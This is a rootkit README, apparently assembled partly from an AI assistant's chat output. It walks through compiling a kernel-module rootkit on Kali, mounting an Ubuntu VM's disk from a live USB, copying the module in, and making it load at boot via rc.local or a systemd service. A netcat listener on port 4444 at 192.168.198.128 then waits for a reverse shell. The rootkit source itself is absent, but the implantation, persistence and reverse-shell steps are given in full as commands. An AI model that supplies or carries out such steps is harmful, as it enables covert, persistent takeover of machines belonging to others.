Rootkit README

Compile in kali

1-
sudo apt-get update
sudo apt-get install linux-headers-$(uname -r)

2-
If the Kali kernel headers don’t match the Ubuntu kernel, you might need to copy the Ubuntu headers to Kali or compile on the Ubuntu VM itself.

3- create a file named rootkit.c and paste the kernel module code I provided.
4- Create a Makefile in the same directory with this content:

5- make


This will produce rootkit.ko.

6- Transfer rootkit.ko to your Ubuntu 24.04 VM (using scp or shared folders).


7- listener in kali
nc -lvnp 4444

Coopy to Ubuntu, EM ATTACK

Here’s a step-by-step guide with commands to implant your rootkit kernel module into the Ubuntu VM’s filesystem from Kali Live USB and set it to load on boot.

Assumptions:

Your Ubuntu VM disk is accessible when booted into Kali Live USB.
You know the Ubuntu root partition device (e.g., /dev/sda1).
You have your rootkit.ko file on Kali Live USB.
1. Boot Kali Live USB in the VM

In VMware, set the VM to boot from the Kali Live USB ISO.

2. Identify Ubuntu root partition

Run:

bash

Copy
sudo fdisk -l
Look for the Linux partition (likely /dev/sda1 or similar).

3. Mount Ubuntu root filesystem

Create a mount point and mount the partition:

bash

Copy
sudo mkdir /mnt/ubuntu
sudo mount /dev/sda1 /mnt/ubuntu
If Ubuntu uses separate /boot or other partitions, mount those accordingly inside /mnt/ubuntu.

4. Copy the rootkit module

Copy your rootkit.ko to a directory inside Ubuntu’s filesystem, for example:

bash

Copy
sudo cp /path/to/rootkit.ko /mnt/ubuntu/lib/modules/$(uname -r)/kernel/
If the kernel version differs, you can check the Ubuntu kernel version by:

bash

Copy
sudo chroot /mnt/ubuntu uname -r
Adjust the path accordingly.

5. Configure rootkit to load on boot

You can add a command to load the module in Ubuntu’s /etc/rc.local (create it if missing):

bash

Copy
sudo nano /mnt/ubuntu/etc/rc.local
Add these lines before exit 0 (or create the file if it doesn’t exist):

bash

Copy
#!/bin/bash
/sbin/insmod /lib/modules/$(uname -r)/kernel/rootkit.ko
exit 0
Make sure the file is executable:

bash

Copy
sudo chmod +x /mnt/ubuntu/etc/rc.local
Alternatively, create a systemd service file inside /mnt/ubuntu/etc/systemd/system/rootkit.service:

ini

Copy
[Unit]
Description=Load rootkit module

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/rootkit.ko
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
Enable it by adding a symlink in /mnt/ubuntu/etc/systemd/system/multi-user.target.wants/ pointing to this service.

6. Unmount and reboot

Unmount the filesystem:

bash

Copy
sudo umount /mnt/ubuntu
Shutdown Kali Live USB:

bash

Copy
sudo poweroff
In VMware, remove the Kali Live USB ISO and boot normally into Ubuntu.

7. Set up listener on your host machine

On your host (192.168.198.128), run:

bash

Copy
nc -lvnp 4444
When Ubuntu boots, the rootkit module loads and should connect back to your listener, giving you a shell.